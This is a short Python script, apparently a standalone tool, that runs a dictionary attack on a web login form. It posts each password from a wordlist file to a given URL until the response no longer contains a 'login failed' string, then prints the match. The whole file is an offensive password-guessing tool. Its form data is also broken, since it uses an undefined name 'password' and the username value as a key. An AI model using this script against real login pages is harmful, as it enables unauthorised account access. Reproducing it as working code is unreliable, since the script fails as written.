import requests
import sys
import time

url = input("Enter the URL: ")
username = input("Enter the username: ")
password_file = input("Enter the password file: ")
login_failed_string = input("Enter the login failed string: ")

with open(password_file, "r") as passwords:
    for line in passwords:
        http = requests.post(url, data={
            username: username,
            password: line.strip()
        })
        if login_failed_string in http.text:
            print("[-] Password is incorrect: " + line.strip())
        else:
            # Print the password
            print("[+] Password is correct: " + line.strip())
            sys.exit(0)
        time.sleep(1)

print("Password not found")